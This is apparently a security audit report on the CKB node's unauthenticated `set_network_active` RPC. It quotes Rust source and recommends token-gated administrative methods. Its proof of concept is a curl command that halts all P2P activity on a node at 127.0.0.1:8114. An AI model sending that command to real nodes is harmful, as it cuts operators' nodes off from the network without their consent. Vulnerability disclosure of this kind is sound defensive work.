### Title
Unauthenticated `set_network_active` RPC Allows Any Local Caller to Halt All P2P Network Activity - (`rpc/src/module/net.rs`)

### Summary

The `set_network_active` RPC method in the `Net` module carries no authentication or authorization check. Any process that can reach the RPC port — the explicit "supported local CLI/RPC user" attacker profile — can call it with `false` and immediately cause the node to silently discard every incoming P2P message (sync, relay, block propagation, discovery). The effect persists until the node is restarted or the same unauthenticated caller reverses it. This is the direct CKB analog of the Yaxis `setHalted()` being callable by the wrong privilege level: in CKB the operation requires *no* privilege at all.

### Finding Description

`set_network_active` is declared in the `NetRpc` trait and implemented in `NetRpcImpl`:

```rust
// rpc/src/module/net.rs:419-420
#[rpc(name = "set_network_active")]
fn set_network_active(&self, state: bool) -> Result<()>;

// rpc/src/module/net.rs:772-775
fn set_network_active(&self, state: bool) -> Result<()> {
    self.network_controller.set_active(state);
    Ok(())
}
```

The implementation unconditionally writes to the `active` atomic flag:

```rust
// network/src/network.rs:1588-1591
/// Change active status, if set false discard any received messages
pub fn set_active(&self, active: bool) {
    self.network_state.active.store(active, Ordering::Release);
}
```

Every CKB protocol handler (`CKBHandler`) gates all message processing on this flag:

```rust
// network/src/protocols/mod.rs:327-329  (connected)
if !self.network_state.is_active() {
    return;
}
// network/src/protocols/mod.rs:351-353  (disconnected)
if !self.network_state.is_active() {
    return;
}
// network/src/protocols/mod.rs:366-368  (received)
if !self.network_state.is_active() {
    return;
}
// network/src/protocols/mod.rs:387-389  (notify/timer)
if !self.network_state.is_active() {
    return;
}
```

A search across all of `rpc/src/**/*.rs` finds **zero** authentication or authorization primitives — no token, no password, no bearer header, no role check. The RPC server is built with `CorsLayer::permissive()` and no middleware that could enforce caller identity:

```rust
// rpc/src/server.rs:119-129
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())
    ...
```

The RPC config has no authentication field; the only protection is the network-level binding address:

```toml
# resource/ckb.toml:182
listen_address = "127.0.0.1:8114"
```

### Impact Explanation

Calling `set_network_active(false)` causes the node to:
- Silently drop every incoming sync message (blocks, headers, compact blocks)
- Silently drop every incoming relay message (transactions, block announcements)
- Silently drop all discovery and ping/pong protocol messages
- Stop propagating its own transactions and blocks to peers

The node appears to be running (process alive, RPC responsive) but is completely isolated from the P2P network. Block synchronization halts, mempool receives no new transactions from peers, and the node cannot relay mined blocks. The effect is permanent until the node is restarted or the same unauthenticated caller sends `set_network_active(true)`.

### Likelihood Explanation

The attacker profile is "supported local CLI/RPC user," which is explicitly in scope. Any process running on the same host as the CKB node — a co-located application, a compromised dependency, a malicious script, or a user with shell access — can issue a single HTTP POST with no credentials:

```json
{"id":1,"jsonrpc":"2.0","method":"set_network_active","params":[false]}
```

Operators who expose the RPC on a non-loopback interface (documented as dangerous but observed in practice for remote management) extend this to any network-reachable attacker. No key, no token, no prior authentication step is required.

### Recommendation

Introduce a privilege tier for destructive/halting RPC operations. Concretely:

1. Add an optional `rpc_secret_token` field to `RpcConfig` (analogous to Bitcoin Core's `rpcauth`).
2. Require the token in an `Authorization` header for methods classified as "administrative": `set_network_active`, `clear_tx_pool`, `clear_tx_verify_queue`, `set_ban`, `clear_banned_addresses`.
3. Methods that are read-only or non-destructive (`get_peers`, `sync_state`, etc.) may remain unauthenticated.

This mirrors the Yaxis fix: restrict the halting operation to the highest available permission level.

### Proof of Concept

```bash
# Halt all P2P activity on a locally running CKB node (no credentials needed)
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"set_network_active","params":[false]}'
# Returns: {"jsonrpc":"2.0","result":null,"id":1}

# Verify: node reports active=false and stops syncing
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"local_node_info","params":[]}'
# Returns: {...,"active":false,...}
```

After this call, `CKBHandler::received`, `CKBHandler::connected`, `CKBHandler::disconnected`, and `CKBHandler::notify` all return immediately without processing any message, confirmed by the `is_active()` guards at `network/src/protocols/mod.rs` lines 327, 351, 366, and 387.
